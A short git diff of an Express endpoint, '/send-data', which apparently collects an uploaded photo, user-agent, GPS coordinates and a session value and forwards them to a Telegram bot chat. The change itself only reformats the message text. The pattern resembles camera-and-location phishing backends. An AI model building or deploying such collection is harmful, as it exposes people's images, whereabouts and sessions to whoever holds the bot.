@@ -77,9 +77,10 @@ app.post("/send-data", upload.single("photo"), async (req, res) => {
    
 
         const info = `
-- User-Agent: ${userAgent}
-- Lokasi: https://www.google.com/maps?q=${latitude},${longitude}
-- Sesi: ${session}
+        **Data Pengguna:**
+        - User-Agent: ${userAgent}
+        - Lokasi: https://www.google.com/maps?q=${latitude},${longitude}
+        - Sesi: ${session}
         `;
 
         
@@ -87,8 +88,8 @@ app.post("/send-data", upload.single("photo"), async (req, res) => {
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("photo", req.file.buffer, "photo.jpg");
-        formData.append("info", info);
         formData.append("caption", caption);
+        formData.append("info", info);
         
 
         const response = await fetch(`${telegramApiUrl}sendPhoto`, {
